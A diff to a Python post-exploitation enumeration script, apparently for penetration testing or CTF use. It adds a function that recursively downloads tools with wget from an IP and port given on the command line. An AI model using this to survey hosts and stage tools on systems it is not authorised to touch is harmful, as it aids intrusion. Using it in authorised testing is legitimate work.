@@ -1,6 +1,8 @@
 #!/bin/python
 
 import os
+import sys
+import re
 
 startscreen = """
 =====================================================
@@ -13,6 +15,16 @@ startscreen = """
                              
 =====================================================
 """
+
+regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+ 
+ 
+def checkip(Ip): 
+    if(re.search(regex, Ip)): 
+        return(True) 
+    else: 
+        return(False) 
+   
 
 # Generated with find /dir/ -maxdepth 3 2>/dev/null
 
@@ -684,7 +696,7 @@ def sysInfo():
     detectServices()
     
 def searchUnique():
-    print("\n[*] Finding interesting files and directories... [*]")
+    print("\n[*] Finding interesting files and directories... [*]\n")
     dirnames = ["var","home","mnt","tmp","media"]
     sysFiles = []
     
@@ -697,7 +709,42 @@ def searchUnique():
         if line not in normalfiles:
             print("\t"+line)
    
+def getTools():
+    print("[*] Transferring tools... [*]")
+    argcheck = False
+    try:
+        if checkip(sys.argv[1]) == True and isinstance(int(sys.argv[2]),int):
+            os.popen('wget -r http://'+sys.argv[1]+':'+sys.argv[2]+'/')
+        else:
+            raise Exception()
+    except:
+        print("\n"+"*"*80)
+        print("\tArgument format error.")
+        print("\tUsage: python nooks.py [IP] [Port]")
+        print("\n"+"*"*80)
+        return
+    
 
 print(startscreen)
-sysInfo()
-searchUnique()
+
+if(len(sys.argv) == 3):
+    sysInfo()
+    searchUnique()
+    getTools()
+    exit()
+    
+if(len(sys.argv) == 1):
+    sysInfo()
+    searchUnique()
+    exit()
+    
+elif(len(sys.argv) > 1):
+    if "-h" in sys.argv or "--help" in sys.argv:
+        print("\n"+"*"*80)
+        print("\tUsage: python nooks.py ([IP] [Port])")
+        print("\n"+"*"*80)
+    else:
+        print("\n"+"*"*80)
+        print("\tArgument error.")
+        print("\tFor more help use nooks.py -h or nooks.py --help")
+        print("*"*80)
